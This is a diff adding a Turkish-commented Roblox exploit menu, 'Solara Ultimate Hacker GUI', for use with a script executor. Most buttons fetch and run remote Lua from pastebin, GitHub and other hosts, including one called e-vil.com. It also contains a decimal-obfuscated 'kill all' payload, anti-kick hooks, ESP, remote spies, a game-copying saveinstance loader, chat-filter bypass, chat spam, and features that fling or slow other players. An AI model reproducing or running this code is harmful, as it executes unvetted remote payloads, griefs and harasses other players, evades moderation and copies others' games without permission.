@@ -1,0 +1,801 @@
+
+--[=[
+Solara Ultimate Hacker GUI - Gelişmiş ve Havalı
+Özellikler: FE Scripts, Client Mods, ESP, Işınlanma, Invisible, GodMode, Noclip,
+WalkOnWalls, Speed/Jump ayarları, Anti Fall Damage, Tool Giver, Chat Spam, Auto Rejoin,
+Anti AFK, Super Punch, Speed Aura, Infinite Jump, Sit Toggle, Fly GUI ve daha fazlası.
+Şık Siyah-Kırmızı Tema, LeftAlt ile GUI toggle, T tuşu ile ışınlanma
+]=]--
+
+-- Services
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local Workspace = game:GetService("Workspace")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local CoreGui = game:GetService("CoreGui")
+local TeleportService = game:GetService("TeleportService")
+
+-- UI Library (Kavo UI)
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("YunusLo1545 GUI", "BloodTheme")
+
+-- Vars
+local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+local humanoid = character:WaitForChild("Humanoid")
+local rootPart = character:WaitForChild("HumanoidRootPart")
+local guiVisible = true
+
+-- Update character refs on respawn
+LocalPlayer.CharacterAdded:Connect(function(char)
+    character = char
+    humanoid = char:WaitForChild("Humanoid")
+    rootPart = char:WaitForChild("HumanoidRootPart")
+end)
+
+-- GUI Toggle LeftAlt
+UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
+    if not gameProcessedEvent and input.KeyCode == Enum.KeyCode.LeftAlt then
+        Library:ToggleUI()
+    end
+end)
+
+
+-- Tabs & Sections
+local tabFE = Window:NewTab("FE Scripts")
+local sectionFE = tabFE:NewSection("Server Side")
+
+local FE = Window:NewTab("FE V2")
+local FESection = FE:NewSection("FE V2 SCRIPTS")
+
+local SPY = Window:NewTab("Remote SPYS")
+local spySection = SPY:NewSection("Remote Finders/Scanners")
+
+
+local tabClient = Window:NewTab("Client")
+local sectionPlayer = tabClient:NewSection("Player Mods")
+local sectionESP = tabClient:NewSection("ESP")
+local sectionExtras = tabClient:NewSection("Extras")
+
+local Chat = Window:NewTab("Chat Bypass")
+local ChatSection = Chat:NewSection("Chat Bypasser")
+
+-- =========================
+-- FE SCRIPTS
+-- =========================
+
+sectionFE:NewButton("c00lclan", "c00lkidd gelişmiş gui", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/14EU4i8n",true))()
+end)
+
+sectionFE:NewButton("FE Kill All", "Tüm oyuncuları öldürür", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/7H6vRJSJ"))()
+end)
+
+sectionFE:NewButton("FE Fling All", "Tüm oyuncuları fırlatır", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
+end)
+
+sectionFE:NewButton("Nameless Admin", "FE Admin GUI açar", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source'))()
+end)
+
+sectionFE:NewButton("SkyHub GUI", "Trolling GUI açar", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/SkyHub.txt"))()
+end)
+
+sectionFE:NewButton("Dex Explorer", "Gelişmiş explorer tool", function()
+     loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()
+end)
+
+sectionFE:NewButton("FE Sound", "Herkeste Ses Çalsın", function()
+    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Fe-play-sound-40621"))()
+end)
+
+sectionFE:NewButton("FE c00lkidd GUI", "Fonksiyonel c00lkidd GUI", function()
+     loadstring(game:HttpGet("https://pastebin.com/raw/AczzXtnG"))()
+end)
+
+sectionFE:NewButton("FE Brookhaven SP HUB","Brookhaven RP En iyi HUB", function()
+     loadstring(game:HttpGet("https://raw.githubusercontent.com/as6cd0/SP_Hub/refs/heads/main/Brookhaven"))()
+end)
+
+sectionFE:NewButton("Brookhaven Sander X 4.2.2", "Brookhaven HUB", function()
+     loadstring(game:HttpGet('https://raw.githubusercontent.com/kigredns/SanderXV4.2.2/refs/heads/main/New.lua'))()
+end)
+
+sectionFE:NewButton("Brookhaven Sander X 3.30", "Brookhaven HUB", function()
+     loadstring(game:HttpGet(('https://raw.githubusercontent.com/sXPiterXs1111/Sanderxv3.30/main/sanderx3.30')))()
+end)
+
+sectionFE:NewButton("Fe Telekinesis V5", "Telekinesi", function()
+    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/randomstring0/Qwerty/refs/heads/main/qwerty11.lua"))()
+end)
+
+sectionFE:NewButton("Fe Radius Blackhole", "Karadelik Çap", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/RkWYLL5t"))();
+end)
+
+sectionFE:NewButton("Fe Car", "Araba Sür Şapkasızwd", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/AlexCr4sh/FeScripts/main/FeCarScript.lua", true))()
+end)
+
+sectionFE:NewButton("Fe Super Ring V4", "Karadelik gibi", function()
+    loadstring(game:HttpGet("https://rawscripts.net/raw/Natural-Disaster-Survival-Super-ring-V4-24296"))()
+end)
+
+sectionFE:NewButton("FE Invisible", "GHOST", function()
+     loadstring(game:HttpGet('https://pastebin.com/raw/3Rnd9rHf'))()
+end)
+
+sectionFE:NewButton("FE Aqua Matrix", "FE Scripts", function()
+     loadstring(game:HttpGet("https://raw.githubusercontent.com/ExploitFin/AquaMatrix/refs/heads/AquaMatrix/AquaMatrix"))()
+end)
+
+sectionFE:NewButton("FE Fling NPCs", "NPCleri Uçur", function()
+     loadstring(game:HttpGet("https://pastebin.com/raw/svyR6YQg"))()
+end)
+
+sectionFE:NewButton("Universal FE Aura", "FE Aura", function()
+    loadstring(game:HttpGet("https://gist.githubusercontent.com/pepfre12/7b5475365b63c2876b9e6ec4022936c3/raw/3732520a19666eb3fd3f7d52cd3f6d2b33a0480a/RealityOrbGlitcherConvert",true))()
+end)
+
+sectionFE:NewButton("Reset Player", "Reset Humanoid", function()
+    local plr = game.Players.LocalPlayer
+    local char = plr.Character
+
+    char.Humanoid.Health = 0
+end)
+
+-- Tool Giver (oyundaki tüm tool'ları verir)
+sectionFE:NewButton("Tool Giver", "Tüm araçları alırsın", function()
+    for _,source in pairs({Workspace, ReplicatedStorage}) do
+        for _,item in pairs(source:GetDescendants()) do
+            if item:IsA("Tool") then
+                pcall(function()
+                    item:Clone().Parent = LocalPlayer.Backpack
+                end)
+            end
+        end
+    end
+end)
+
+sectionFE:NewToggle("FE God Mode", "Sürekli Tam Can", function(State)
+    local plr = game.Players.LocalPlayer
+local char = plr.Character or plr.CharacterAdded:Wait()
+local hum = char:WaitForChild("Humanoid")
+
+-- Karakter yeniden doğarsa güncelle
+plr.CharacterAdded:Connect(function(c)
+    char = c
+    hum = char:WaitForChild("Humanoid")
+end)
+
+-- Canı sabitle ama GUI'de az görünsün
+game:GetService("RunService").Heartbeat:Connect(function()
+    if hum and hum.Health > 0 then
+        -- Gerçek canı koru
+        hum.Health = hum.MaxHealth
+        hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
+
+        -- GUI'de düşük görünmesi için sahte değer ver
+        hum.HealthDisplayType = Enum.HumanoidHealthDisplayType.AlwaysOn
+        hum.NameDisplayDistance = 0
+        hum.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
+    end
+end)
+
+end)
+
+-- Anti Kick / Ban Toggle
+local antiKickEnabled = false
+local originalOnKick
+
+sectionFE:NewToggle("Anti Kick / Ban", "Kick veya banlanmayı engellemeye çalışır (client-side)", function(state)
+    antiKickEnabled = state
+    if state then
+        -- OnKick fonksiyonunu engelle
+        originalOnKick = LocalPlayer.OnKick
+        LocalPlayer.OnKick = function()
+            -- Sonsuz bekleme ile kick'i engellemeye çalışır
+            wait(9e9)
+        end
+    else
+        -- Orijinal OnKick fonksiyonunu geri yükle
+        if originalOnKick then
+            LocalPlayer.OnKick = originalOnKick
+            originalOnKick = nil
+        else
+            LocalPlayer.OnKick = nil
+        end
+    end
+end)
+
+sectionFE:NewToggle("FE NPC Control", "NPCleri Kontrol Et", function()
+     loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/Qwerty/refs/heads/main/qwerty13.lua"))()
+end)
+
+--FE V2
+
+FESection:NewButton("FE Btools", "FE Btools bazı oyunlarda çalışır", function()
+    loadstring(game:GetObjects("rbxassetid://6695644299")[1].Source)()
+end)
+
+FESection:NewButton("FE Bring Unanchored", "FE Bring Unanchored", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ArceusXArchivezx/Game/refs/heads/main/ArceusXArchive"))()
+end)
+
+FESection:NewButton("FE Bang", "FE Bang", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/4gh9/Bang-Script-Gui/main/bang%20gui.lua'))()
+end)
+
+FESection:NewButton("FE Universal Viewer", "FE Universal Viewer", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/KmiuAFZh"))()
+end)
+
+FESection:NewButton("FE Chat Spy", "FE Chat Spy", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Dan41/Roblox-Scripts/refs/heads/main/CHAT%20SPY%20-%202025/ChatSpy2025.lua', true))()
+end)
+
+FESection:NewButton("FE Kill All(Sword)", "Sword Needed", function()
+    loadstring("\108\111\99\97\108\32\76\80\32\61\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\80\108\97\121\101\114\115\34\41\46\76\111\99\97\108\80\108\97\121\101\114\10\119\104\105\108\101\32\119\97\105\116\40\48\46\49\41\32\100\111\10\102\111\114\32\105\44\118\32\105\110\32\112\97\105\114\115\40\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\80\108\97\121\101\114\115\34\41\58\71\101\116\80\108\97\121\101\114\115\40\41\41\32\100\111\10\105\102\32\118\32\97\110\100\32\118\46\67\104\97\114\97\99\116\101\114\32\97\110\100\32\118\32\126\61\32\76\80\32\97\110\100\32\118\46\67\104\97\114\97\99\116\101\114\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\72\101\97\100\34\41\32\116\104\101\110\10\108\111\99\97\108\32\104\114\112\32\61\32\118\46\67\104\97\114\97\99\116\101\114\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\72\101\97\100\34\41\32\10\104\114\112\58\66\114\101\97\107\74\111\105\110\116\115\40\41\10\104\114\112\46\84\114\97\110\115\112\97\114\101\110\99\121\32\61\32\48\10\104\114\112\46\66\114\105\99\107\67\111\108\111\114\32\61\32\118\46\84\101\97\109\67\111\108\111\114\10\104\114\112\46\65\110\99\104\111\114\101\100\32\61\32\116\114\117\101\10\104\114\112\46\67\97\110\67\111\108\108\105\100\101\32\61\32\102\97\108\115\101\10\112\99\97\108\108\40\102\117\110\99\116\105\111\110\40\41\10\104\114\112\46\67\70\114\97\109\101\32\61\32\76\80\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\46\67\70\114\97\109\101\32\42\32\67\70\114\97\109\101\46\110\101\119\40\49\44\48\44\45\51\46\53\41\10\101\110\100\41\10\101\110\100\10\101\110\100\10\101\110\100\10")()
+end)
+
+FESection:NewButton("FE AFK", "Oyundan atılmamanı sağlar", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/jonashstudio/Antiafk/refs/heads/main/Anti%20afk"))()
+end)
+
+
+
+
+
+
+FESection:NewButton("Collision Enabler", "Collision Enabler", function()
+LP = game.Players.LocalPlayer
+while wait(3) do
+    for i,v in pairs(game.Players:GetDescendants()) do
+        if v:IsA("Player") and workspace:FindFirstChild(v.Name) and v ~= LP and workspace[v.Name]:FindFirstChild("CHECKER") == nil then
+            checker = Instance.new("BoolValue",workspace[v.Name])
+            checker.Name = "CHECKER"
+            for i,v in pairs(workspace:WaitForChild(v.Name):GetDescendants()) do
+                if v:IsA("Part") or v:IsA("MeshPart") then
+                    local collider = Instance.new("Part",v)
+                    collider.Size = v.Size
+                    collider.Position = v.Position
+                    collider.Transparency = 1
+                    local weld = Instance.new("Weld",v)
+                    weld.Part0 = v
+                    weld.Part1 = collider
+                end
+            end
+        end
+    end
+end
+end)
+
+
+
+
+
+FESection:NewButton("FE Copier", "Oyun kopyalayıcı", function()
+    local Params = {
+ RepoURL = "https://raw.githubusercontent.com/luau/SynSaveInstance/main/",
+ SSI = "saveinstance",
+}
+local synsaveinstance = loadstring(game:HttpGet(Params.RepoURL .. Params.SSI .. ".luau", true), Params.SSI)()
+local Options = {} -- Documentation here https://luau.github.io/UniversalSynSaveInstance/api/SynSaveInstance
+synsaveinstance(Options)
+end)
+
+FESection:NewButton("FE Part Controller", "Anchored Parts", function()
+        pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/hm5650/PartController/refs/heads/main/PartController.lua", true))()
+    end)
+end)
+
+--SPY REMOTES ETC..
+
+spySection:NewButton("Ketamine HUB", "Ketamine HUB", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/InfernusScripts/Ketamine/refs/heads/main/Ketamine.lua"))()
+end)
+
+spySection:NewButton("YunusLoSPY", "YunusLoSPY", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/spNy5paF"))()
+end)
+
+spySection:NewButton("SPY", "SPY", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/spNy5paF"))()
+end)
+
+spySection:NewButton("Remote SPY", "Remote SPY", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/SimpleSpyV3/main.lua"))()
+end)
+
+spySection:NewButton("Sigma Spy", "Sigma Spy", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/depthso/Sigma-Spy/refs/heads/main/Main.lua"))()
+end)
+
+spySection:NewButton("Skid Spy | Http Spy", "Skid Spy | Http Spy", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/CookieCrumble2/SkidSpy/refs/heads/main/Loader.luau"))()
+end)
+
+spySection:NewButton("Remote Scanner", "Remote Scanner", function()
+    loadstring(game:HttpGetAsync("https://github.com/richie0866/remote-spy/releases/latest/download/RemoteSpy.lua"))()
+end)
+
+spySection:NewButton("ROBLOX UNIVERSAL REMOTE EVENT SCANNER", "ROBLOX UNIVERSAL REMOTE EVENT SCANNER", function()
+    -- Function to recursively search for RemoteEvents in a given instance
+local function findRemoteEvents(instance)
+    for _, child in ipairs(instance:GetChildren()) do
+        if child:IsA("RemoteEvent") then
+            print(child:GetFullName()) -- Prints the full path of the RemoteEvent
+        end
+        findRemoteEvents(child)
+    end
+end
+
+-- Start the search from the game's Workspace, ReplicatedStorage, and ReplicatedFirst
+findRemoteEvents(game.Workspace)
+findRemoteEvents(game.ReplicatedStorage)
+findRemoteEvents(game.ReplicatedFirst)
+
+end)
+
+
+-- DEVAMINI aynen korudum, aşağıdaki kod parçalarını da ekleyebilirim istersen.
+
+-- CLIENT MODS
+-- Speed slider
+sectionPlayer:NewSlider("Speed", "Yürüme hızını ayarlar", 500, 16, function(val)
+    if humanoid then humanoid.WalkSpeed = val end
+end)
+
+-- Jump slider
+sectionPlayer:NewSlider("Jump Power", "Zıplama gücünü ayarlar", 300, 50, function(val)
+    if humanoid then humanoid.JumpPower = val end
+end)
+
+-- Jump power sıkıntısı için button
+sectionPlayer:NewButton("Fix Jump Power", "", function()
+    game.Players.LocalPlayer.Character.Humanoid.UseJumpPower = true
+end)
+
+
+--[[God Mode toggle
+local godConn
+sectionPlayer:NewToggle("God Mode", "Sürekli tam can", function(state)
+    if state then
+        godConn = RunService.Heartbeat:Connect(function()
+            if humanoid and humanoid.Health < humanoid.MaxHealth then
+                humanoid.Health = humanoid.MaxHealth
+            end
+        end)
+    elseif godConn then
+        godConn:Disconnect()
+    end
+end)]]--
+
+sectionExtras:NewButton("Executor Checker", "Executor Checker", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/RealBatu20/AI-Scripts-2025/refs/heads/main/ExecutorTestsPanel.lua"))()
+end)
+
+sectionExtras:NewButton("Simple Exploit Maker", "Simple Exploit Maker", function()
+    loadstring(game:HttpGet("https://e-vil.com/anbu/rem.lua"))()
+end)
+
+sectionExtras:NewButton("sUNC Tester", "sUNC test yapma konsola bakın", function()
+    getgenv().sUNCDebug = {
+    ["printcheckpoints"] = false,
+    ["delaybetweentests"] = 0,
+    ["printtesttimetaken"] = false,
+}
+
+loadstring(game:HttpGet("https://script.sunc.su/"))()
+end)
+
+sectionExtras:NewButton("UNC Tester", "UNC test yapma konsola bakın", function()
+    loadstring(game:HttpGet("https://github.com/ltseverydayyou/uuuuuuu/blob/main/UNC%20test?raw=true"))()
+end)
+
+-- Invisible client-side toggle
+local invisibleOn = false
+sectionPlayer:NewToggle("Invisible (Client-Side)", "Sadece sen görünmez ol", function(state)
+    invisibleOn = state
+    if character then
+        for _,part in pairs(character:GetDescendants()) do
+            if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
+                part.Transparency = state and 1 or 0
+                part.CanCollide = not state
+            end
+        end
+    end
+end)
+
+-- Noclip toggle
+local noclipConn
+sectionPlayer:NewToggle("Noclip", "Engellerden geç", function(state)
+    if noclipConn then noclipConn:Disconnect() end
+    if state then
+        noclipConn = RunService.Stepped:Connect(function()
+            if character then
+                for _,part in pairs(character:GetChildren()) do
+                    if part:IsA("BasePart") then
+                        part.CanCollide = false
+                    end
+                end
+            end
+        end)
+    end
+end)
+
+-- Walk On Walls toggle
+local walkWallsConn
+sectionExtras:NewToggle("Walk On Walls", "Duvarda yürü", function(state)
+    if walkWallsConn then walkWallsConn:Disconnect() end
+    if state then
+        walkWallsConn = RunService.Stepped:Connect(function()
+            if character and rootPart and humanoid then
+                local ray = Ray.new(rootPart.Position, Vector3.new(0, -5, 0))
+                local hit, pos = Workspace:FindPartOnRay(ray, character)
+                if hit and hit.CanCollide then
+                    humanoid.PlatformStand = false
+                    humanoid:ChangeState(Enum.HumanoidStateType.Freefall)
+                else
+                    humanoid.PlatformStand = true
+                end
+            end
+        end)
+    else
+        if humanoid then humanoid.PlatformStand = false end
+    end
+end)
+
+-- Anti Fall Damage toggle
+local afdConn
+sectionExtras:NewToggle("Anti Fall Damage", "Düşerken hasar alma", function(state)
+    if afdConn then afdConn:Disconnect() end
+    if state then
+        afdConn = RunService.Stepped:Connect(function()
+            if humanoid and humanoid:GetState() == Enum.HumanoidStateType.Freefall then
+                humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+            end
+        end)
+    end
+end)
+
+--[[Sit anywhere (Z otur, X kalk)
+UserInputService.InputBegan:Connect(function(input, gp)
+    if gp then return end
+    if input.KeyCode == Enum.KeyCode.Z then
+        if humanoid then humanoid.Sit = true end
+    elseif input.KeyCode == Enum.KeyCode.X then
+        if humanoid then humanoid.Sit = false end
+    end
+end)]]--
+
+-- Sit toggle (tek tuşla otur kalk)
+local sitToggle = false
+sectionExtras:NewToggle("Sit Toggle", "Tek tuşla otur/kalk", function(state)
+    sitToggle = state
+    if not sitToggle and humanoid then
+        humanoid.Sit = false
+    end
+end)
+UserInputService.InputBegan:Connect(function(input, gp)
+    if gp then return end
+    if sitToggle and input.KeyCode == Enum.KeyCode.Z then
+        humanoid.Sit = not humanoid.Sit
+    end
+end)
+
+-- Fly GUI butonu
+sectionExtras:NewButton("Fly GUI", "Fly GUI açar", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))()
+end)
+
+-- ESP
+
+local espEnabled = false
+local nameEspEnabled = false
+local boxEspEnabled = false
+local espObjects = {}
+
+local function clearESP()
+    for _,v in pairs(espObjects) do
+        if v and v.Parent then
+            v:Destroy()
+        end
+    end
+    espObjects = {}
+end
+
+local function updateESP()
+    clearESP()
+    if not espEnabled and not nameEspEnabled and not boxEspEnabled then return end
+    for _,plr in pairs(Players:GetPlayers()) do
+        if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
+            if espEnabled then
+                local highlight = Instance.new("Highlight")
+                highlight.Adornee = plr.Character
+                highlight.FillColor = plr.TeamColor.Color
+                highlight.OutlineColor = Color3.new(1,1,1)
+                highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+                highlight.Parent = CoreGui
+                table.insert(espObjects, highlight)
+            end
+            local head = plr.Character:FindFirstChild("Head") or plr.Character:FindFirstChild("HumanoidRootPart")
+            if nameEspEnabled then
+                local bb = Instance.new("BillboardGui", head)
+                bb.Size = UDim2.new(0,150,0,40)
+                bb.AlwaysOnTop = true
+                local label = Instance.new("TextLabel", bb)
+                label.Size = UDim2.new(1,0,1,0)
+                label.BackgroundTransparency = 1
+                label.TextColor3 = Color3.new(1,1,1)
+                label.TextScaled = true
+                local dist = math.floor((plr.Character.HumanoidRootPart.Position - rootPart.Position).Magnitude)
+                label.Text = plr.Name .. " [" .. dist .. "m]"
+                table.insert(espObjects, bb)
+            end
+            if boxEspEnabled then
+                local box = Instance.new("BoxHandleAdornment")
+                box.Adornee = plr.Character:FindFirstChild("HumanoidRootPart")
+                box.Size = Vector3.new(4,6,1)
+                box.Color3 = plr.TeamColor.Color
+                box.Transparency = 0.5
+                box.AlwaysOnTop = true
+                box.Parent = CoreGui
+                table.insert(espObjects, box)
+            end
+        end
+    end
+end
+
+sectionESP:NewToggle("Enable ESP", "Takım renkli isim kutusu", function(state)
+    espEnabled = state
+    updateESP()
+end)
+
+sectionESP:NewToggle("Name ESP", "Oyuncu isimlerini göster", function(state)
+    nameEspEnabled = state
+    updateESP()
+end)
+
+sectionESP:NewToggle("Box ESP", "Kutuyla göster", function(state)
+    boxEspEnabled = state
+    updateESP()
+end)
+
+Players.PlayerAdded:Connect(function()
+    updateESP()
+end)
+
+Players.PlayerRemoving:Connect(function()
+    updateESP()
+end)
+
+--Chat Bypass
+
+ChatSection:NewButton("Fe Gaze Bypass V4", "Works all games", function()
+    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Gaze-bypass-Altered-21081"))()
+end)
+
+-- Extras
+
+-- Teleport to player by name (case insensitive, partial)
+sectionExtras:NewTextBox("Teleport To Player", "Oyuncu ismi yaz", function(input)
+    if input == "" then return end
+    local target = nil
+    local linput = input:lower()
+    for _,plr in pairs(Players:GetPlayers()) do
+        if plr.Name:lower():find(linput) then
+            target = plr
+            break
+        end
+    end
+    if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
+        rootPart.CFrame = target.Character.HumanoidRootPart.CFrame + Vector3.new(0,5,0)
+    else
+        warn("Oyuncu bulunamadı veya karakter hazır değil!")
+    end
+end)
+
+-- Teleport dropdown (liste ile seç)
+local playerNames = {}
+local function refreshPlayerNames()
+    playerNames = {}
+    for _,plr in pairs(Players:GetPlayers()) do
+        table.insert(playerNames, plr.Name)
+    end
+end
+refreshPlayerNames()
+
+sectionExtras:NewDropdown("Teleport To Player (Select)", "Listeden oyuncu seç", playerNames, function(selected)
+    local plr = Players:FindFirstChild(selected)
+    if plr and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
+        rootPart.CFrame = plr.Character.HumanoidRootPart.CFrame + Vector3.new(0,5,0)
+    else
+        warn("Oyuncu bulunamadı veya hazır değil!")
+    end
+end)
+
+Players.PlayerAdded:Connect(refreshPlayerNames)
+Players.PlayerRemoving:Connect(refreshPlayerNames)
+
+-- Auto Rejoin toggle
+local autoRejoinConn
+local autoRejoinEnabled = false
+sectionExtras:NewToggle("Auto Rejoin", "Sunucudan atılırsan tekrar bağlan", function(state)
+    autoRejoinEnabled = state
+    if state then
+        if autoRejoinConn then autoRejoinConn:Disconnect() end
+        autoRejoinConn = LocalPlayer.OnTeleport:Connect(function()
+            if autoRejoinEnabled then
+                TeleportService:Teleport(game.PlaceId, LocalPlayer)
+            end
+        end)
+    else
+        if autoRejoinConn then autoRejoinConn:Disconnect() end
+    end
+end)
+
+-- Anti AFK toggle
+local antiAfkConn
+local antiAfkEnabled = false
+sectionExtras:NewToggle("Anti AFK", "Atılmanı engeller", function(state)
+    antiAfkEnabled = state
+    if state then
+        antiAfkConn = game:GetService("VirtualUser")
+        antiAfkConn:Button2Down(Vector2.new(0,0), Workspace.CurrentCamera.CFrame)
+        antiAfkConn:Button2Up(Vector2.new(0,0), Workspace.CurrentCamera.CFrame)
+    else
+        antiAfkConn = nil
+    end
+end)
+
+-- Super Punch button
+sectionExtras:NewButton("Super Punch", "Yakındaki oyuncuları hızlı vur", function()
+    for _, plr in pairs(Players:GetPlayers()) do
+        if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
+            local dist = (plr.Character.HumanoidRootPart.Position - rootPart.Position).Magnitude
+            if dist < 10 then
+                local hitbox = Instance.new("Part")
+                hitbox.Size = Vector3.new(10,10,10)
+                hitbox.Transparency = 1
+                hitbox.CanCollide = false
+                hitbox.Anchored = true
+                hitbox.CFrame = plr.Character.HumanoidRootPart.CFrame
+                hitbox.Parent = Workspace
+                game.Debris:AddItem(hitbox, 0.1)
+            end
+        end
+    end
+end)
+
+-- Speed Aura toggle
+local speedAuraConn
+local speedAuraEnabled = false
+sectionExtras:NewToggle("Speed Aura", "Yakındaki oyuncuları yavaşlat", function(state)
+    speedAuraEnabled = state
+    if speedAuraEnabled then
+        speedAuraConn = RunService.Heartbeat:Connect(function()
+            for _,plr in pairs(Players:GetPlayers()) do
+                if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
+                    local dist = (plr.Character.HumanoidRootPart.Position - rootPart.Position).Magnitude
+                    local hum = plr.Character:FindFirstChild("Humanoid")
+                    if dist < 15 and hum then
+                        hum.WalkSpeed = 5
+                    elseif hum then
+                        hum.WalkSpeed = 16
+                    end
+                end
+            end
+        end)
+    else
+        if speedAuraConn then speedAuraConn:Disconnect() end
+        for _,plr in pairs(Players:GetPlayers()) do
+            if plr.Character then
+                local hum = plr.Character:FindFirstChild("Humanoid")
+                if hum then
+                    hum.WalkSpeed = 16
+                end
+            end
+        end
+    end
+end)
+
+-- Infinite Jump toggle
+local infiniteJumpEnabled = false
+UserInputService.JumpRequest:Connect(function()
+    if infiniteJumpEnabled then
+        if humanoid then
+            humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+        end
+    end
+end)
+sectionExtras:NewToggle("Infinite Jump", "İstediğin kadar zıpla", function(state)
+    infiniteJumpEnabled = state
+end)
+
+-- WalkSpeed Multiplier slider
+local walkSpeedMult = 1
+sectionExtras:NewSlider("WalkSpeed Multiplier", "Yürüme hızını katlar", 10, 1, function(val)
+    walkSpeedMult = val
+    if humanoid then
+        humanoid.WalkSpeed = 16 * walkSpeedMult
+    end
+end)
+
+-- JumpPower Multiplier slider
+local jumpPowerMult = 1
+sectionExtras:NewSlider("JumpPower Multiplier", "Zıplama gücünü katlar", 10, 1, function(val)
+    jumpPowerMult = val
+    if humanoid then
+        humanoid.JumpPower = 50 * jumpPowerMult
+    end
+end)
+
+-- Chat spam durumunu tutan değişken
+local spamEnabled = false
+local spamMessages = {
+    "Solara rocks!", "I hacked this game!", "Epic Script!", "Join my Discord!", "Follow me!", "Best GUI ever!"
+}
+local spamConn = nil
+
+-- Servisleri alıyoruz
+local RunService = game:GetService("RunService")
+local Players = game:GetService("Players")
+local TextChatService = game:GetService("TextChatService")
+
+-- Kullanıcının chat spam'i açıp kapatmasını sağlayan GUI öğesi
+sectionExtras:NewToggle("Chat Spam", "Otomatik chat spam (kapalı tavsiye edilir)", function(state)
+    spamEnabled = state
+    if spamEnabled then
+        spamConn = RunService.Heartbeat:Connect(function()
+            if TextChatService.ChatVersion == Enum.TextChatVersion.LegacyChatService then
+                -- Eski chat sistemi için
+                local defaultChatEvents = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
+                if defaultChatEvents then
+                    local sayMessageRequest = defaultChatEvents:FindFirstChild("SayMessageRequest")
+                    if sayMessageRequest then
+                        sayMessageRequest:FireServer(spamMessages[math.random(1, #spamMessages)], "All")
+                    end
+                end
+            elseif TextChatService.ChatVersion == Enum.TextChatVersion.TextChatService then
+                -- Yeni chat sistemi için
+                local defaultChannel = TextChatService:FindFirstChild("TextChannels"):FindFirstChild("RBXGeneral")
+                if defaultChannel then
+                    defaultChannel:SendAsync(spamMessages[math.random(1, #spamMessages)])
+                end
+            end
+        end)
+    elseif spamConn then
+        spamConn:Disconnect()
+        spamConn = nil -- Bağlantıyı kestikten sonra değişkeni temizliyoruz
+    end
+end)
+
+-- Teleport to mouse toggle ve T tuşu ışınlama sistemi
+local teleportToMouseEnabled = false
+sectionExtras:NewToggle("Teleport to Mouse (T toggle)", "T ile imleç pozisyonuna ışınlan", function(state)
+    teleportToMouseEnabled = state
+end)
+
+UserInputService.InputBegan:Connect(function(input, gp)
+    if gp then return end
+    if input.KeyCode == Enum.KeyCode.T and teleportToMouseEnabled then
+        local mouseLoc = UserInputService:GetMouseLocation()
+        local ray = Workspace.CurrentCamera:ScreenPointToRay(mouseLoc.X, mouseLoc.Y)
+        local pos = ray.Origin + ray.Direction * 200
+        if rootPart then
+            rootPart.CFrame = CFrame.new(pos)
+        end
+    end
+end)
+
+-- Başlangıçta ESP ve oyuncu listesi güncelle
+updateESP()
+refreshPlayerNames()
+
+print("Solara Ultimate Hacker GUI başarıyla yüklendi!")
